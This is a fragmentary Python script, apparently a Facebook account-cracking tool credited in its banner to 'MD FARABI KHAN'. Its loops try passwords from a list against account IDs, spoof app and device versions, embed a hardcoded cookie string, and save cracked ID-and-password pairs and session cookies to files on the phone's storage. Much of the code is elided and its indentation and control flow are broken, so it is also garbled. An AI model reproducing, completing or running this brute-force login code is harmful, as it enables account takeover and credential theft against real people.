...
EXTRA ='\x1b[38;5;208m'
logo=("""\033[1;36m╔═════════════════════════════════════════╗                      
║\033[1;92m_______    ____  ___    ______  __               / ____/   |  / __ \/   |  / __ ) \/ /
...
\33[1;91m[\33[1;97m★\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92mMD FARABI KHAN 
\33[1;91m[\33[1;97m★\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92mFARABI-420
\33[1;91m[\33[1;97m★\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m2.3
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/tasli-OK🌺.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/tasli-CP-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/tasli-CP-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        ...
        try:
                for pas in passlist:
                        accessToken = '  datr=gRmHZQtUXZx5_6MYfiUn77__;sb=gRmHZdWR5K1sRVnsPKahbjHJ;m_pixel_ratio=3.370364189147949;fr=0HVEf396lf6ig5n51.AWWw7GsEdHgRoJlz-q7cE_m7tnE.BlhxmB.20.AAA.0.0.Blhxme.AWXaRWpjo5s;c'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/tasli-COOKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/tasli-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
